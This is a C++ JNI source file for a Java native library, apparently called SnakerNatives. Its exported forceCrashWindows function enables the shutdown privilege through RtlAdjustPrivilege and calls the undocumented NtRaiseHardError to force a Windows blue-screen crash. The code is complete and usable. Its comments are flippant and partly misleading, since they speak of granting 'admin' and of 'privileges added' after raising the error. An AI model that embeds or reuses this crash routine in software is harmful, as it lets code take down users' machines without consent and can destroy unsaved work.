#include "xyz_snaker_natives_SnakerNatives.h"

#include <iostream>

#include <windows.h>
#include <ntstatus.h>
#include <ntsecapi.h>
#include <winternl.h>

#include <jni.h>

using namespace std;

typedef NTSTATUS (NTAPI *RtlAdjustPrivilegeFn)
(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled
);

RtlAdjustPrivilegeFn RtlAdjustPrivilege;

typedef NTSTATUS (NTAPI *NtRaiseHardErrorFn)
(
    LONG ErrorStatus,
    ULONG Unless1,
    ULONG Unless2,
    PULONG_PTR Unless3,
    ULONG ValidResponseOption,
    PULONG ResponsePointer
);

NtRaiseHardErrorFn NtRaiseHardError;

JNIEXPORT void JNICALL Java_xyz_snaker_natives_SnakerNatives_forceCrashWindows(JNIEnv* env, jobject obj)
{
    Java_xyz_snaker_natives_SnakerNatives_assignElevationNoPrompt(env, obj); // Assign admin
    Java_xyz_snaker_natives_SnakerNatives_raiseInternalError(env, obj); // Raise hard error
}

JNIEXPORT jint JNICALL Java_xyz_snaker_natives_SnakerNatives_assignElevationNoPrompt(JNIEnv* env, jobject obj)
{
    BOOLEAN Enabled = FALSE; // Enable this function
    HMODULE NtDll = GetModuleHandle("ntdll.dll"); // Get the retro library lol

    if (NtDll == NULL) {
        return -1; // This user is probably not running on a windows computer
    }

    RtlAdjustPrivilege = (RtlAdjustPrivilegeFn) GetProcAddress(NtDll, "RtlAdjustPrivilege"); // Get the internal function

    if (RtlAdjustPrivilege == NULL) {
        return -1; // This function does not exist (somehow)
    }

    NTSTATUS Status = RtlAdjustPrivilege(19, TRUE, FALSE, &Enabled); // Adjust the privileges to give snakerlib.dll admin!

    if (Status != 0) {
        return -1; // They are probably running on a restricted school computer...
    }

    if (Enabled) {
        return 0; // Privileges added successfully
    } else {
        return -1; // Could not add privileges...
    }
}

JNIEXPORT jint JNICALL Java_xyz_snaker_natives_SnakerNatives_raiseInternalError(JNIEnv* env, jobject obj)
{
    ULONG ErrorResponse = 0; // This error response
    HMODULE NtDll = GetModuleHandle("ntdll.dll"); // Get the retro library lol

    if (NtDll == NULL) {
        return -1; // This user is probably not running on a windows computer
    }

    NtRaiseHardError = (NtRaiseHardErrorFn) GetProcAddress(NtDll, "NtRaiseHardError"); // Get the internal function

    if (NtRaiseHardError == NULL) {
        return -1; // This function does not exist (somehow)
    }

    NTSTATUS Status = NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse); // Raise a hard error

    if (Status != 0) {
        return -1; // Could not add privileges...
    }

    return 0; // Privileges added successfully
}